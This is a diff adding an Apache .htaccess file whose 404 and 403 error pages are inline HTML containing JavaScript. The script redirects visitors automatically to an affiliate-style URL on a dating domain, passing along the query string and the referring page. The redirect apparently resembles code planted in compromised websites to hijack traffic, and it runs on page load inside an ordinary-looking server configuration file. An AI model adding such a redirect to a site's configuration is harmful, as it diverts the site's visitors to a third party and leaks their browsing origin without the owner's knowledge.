@@ -1,0 +1,6 @@
+RewriteEngine On
+RewriteBase /
+
+ErrorDocument 404 "<html><head><title>Attractive World</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"></head><body><script type=\"text/javascript\">var search = window.location.search;if( search.length < 1 ){search = \"?\";var ref = \"ref=\"+document.referrer;}else{var ref = \"&ref=\"+document.referrer;}location.href='http://dating.attractiveworld.com/en-au/ge7n61/404561/'+search+ref;</script><a href=\"https://www.attractiveworld.com/en-au/\">attractiveworld.com</a></body></html>"
+
+ErrorDocument 403 "<html><head><title>Attractive World</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"></head><body><script type=\"text/javascript\">var search = window.location.search;if( search.length < 1 ){search = \"?\";var ref = \"ref=\"+document.referrer;}else{var ref = \"&ref=\"+document.referrer;}location.href='http://dating.attractiveworld.com/en-au/ge7n61/404561/'+search+ref;</script><a href=\"https://www.attractiveworld.com/en-au/\">attractiveworld.com</a></body></html>"
